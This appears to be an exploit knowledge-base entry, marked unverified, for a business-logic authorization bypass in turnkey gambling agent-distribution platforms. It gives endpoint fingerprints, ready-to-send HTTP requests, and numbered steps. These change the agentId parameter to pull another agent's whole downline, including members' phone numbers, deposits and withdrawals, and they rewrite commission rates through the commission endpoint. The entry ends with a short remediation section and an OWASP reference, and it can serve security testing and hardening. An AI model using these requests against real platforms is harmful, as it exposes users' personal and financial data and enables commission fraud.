---
title: Agent hierarchy authorization bypass (read site-wide downlines / change commission rates)
cve: None (business logic)
severity: critical
cvss: 8.8
product: Turnkey gambling platform / agent distribution system
versions: Any
ports: 80, 443
keywords: agent, agentId, hierarchy authorization bypass, commission, rebates, member list
entry: Change agentId to read another agent's downline; change rate to raise commission
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
/api/agent/member/list?agentId=10001     /api/agent/sub/list?agentId=
/api/report/agent/team?agentId=&date=    /api/agent/commission/set
/api/agent/rebate/config                 /api/agent/invite/bind
```

These sites pass the "master agent → agent → member" hierarchy in **request parameters**; the server checks only "is the user logged in?", not "does this tree belong to the user?".

## Prerequisites

- A regular member account is sufficient (most turnkey sites offer self-service agent activation with a very low barrier).
- Capture your own `agentId` and token.

## PoC

```http
GET /api/agent/member/list?agentId=1&pageNo=1&pageSize=50 HTTP/1.1
Host: target
Authorization: Bearer <your token>

POST /api/agent/commission/set HTTP/1.1
Content-Type: application/json

{"agentId":10001,"gameType":"lottery","rate":"0.90"}
```

## Exploitation Steps

1. Request your own `agentId` with your token and confirm it returns your downline (baseline).
2. Replace `agentId` with `1`, `10001`, or `10002` (master agents are often 1 or 10000+) and check whether another agent's entire tree is returned.
3. Successful access exposes downline members' phone numbers, transactions, deposits/withdrawals, and rebate records — affecting both privacy and finances.
4. Increase commission: read the current rate → change it using your own account (change only your own rate and observe whether it takes effect); changing others' rates is more severe.
5. Evidence: one request for each of two agentId values + a comparison of record counts; retain only 1-2 records, not an entire table export.

## Remediation and Mitigation (Hardening)

- Derive `agentId` from the server session, not the request; enforce a query condition requiring the current user to be in the ancestor chain.
- Require approval workflows + two-person review + audit logs for commission/rebate rate changes; hard-code rate caps.
- Filter list endpoints by hierarchy and enforce row-level authorization (return 403 rather than an empty list).

## References

- OWASP API Security Top 10：API1 BOLA / API5 BFLA。
